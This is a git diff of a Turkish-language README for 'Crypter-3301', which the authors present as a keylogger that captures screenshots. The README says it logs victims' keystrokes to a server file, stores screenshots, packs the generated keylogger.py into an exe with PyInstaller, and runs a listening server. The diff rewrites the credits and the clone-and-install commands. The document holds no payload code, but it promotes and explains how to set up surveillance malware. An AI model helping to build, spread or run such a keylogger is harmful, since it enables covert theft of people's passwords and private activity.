@@ -1,8 +1,6 @@
 # Crypter-3301(Beta)
 Crypter 3301, Ero145 ile yaptığımız Ekran Görüntüsü Alabilen bir Keylogger Aracıdır.
-
-Desteklerin için teşekkür ederim Dostum🙏🏻
-# Ero145: https://github.com/Ero145
+Desteklerin için teşekkür ederim Dostum🙏🏻 (Ero145)
 
 ![WhatsApp Image 2024-12-31 at 17 48 52](https://github.com/user-attachments/assets/e041e137-7495-4b10-907d-84108bc64f53)
 
@@ -11,7 +9,7 @@ keylog.txt(Sunucuya gelen tuşlar bu dosyaya kaydedilir) ve images klasörü(SS 
 Sonra program sizde oluşturulan keylogger.py dosyasının yolunu ister. Yoldoğu girilince python dosyasını exe ye çevirir(PyInstaller ile).
 Exe başarılı bir şekilde oluşturulursa server.py çalıştırılır ve oluşturulan exe'nin açılması beklenir. Bazı ufak hatalar olabilir(Ufak hataları düzelteceğiz).
 
-<git clone https://github.com/zer0crypt02/Crypter-3301><br>
-<cd Crypter-3301><br>
-<pip3 install -r requirements.txt>
-<python3 >
+git clone https://github.com/zer0crypt02/Crypter-3301
+cd Crypter-3301
+pip3 install -r requirements.txt
+python3
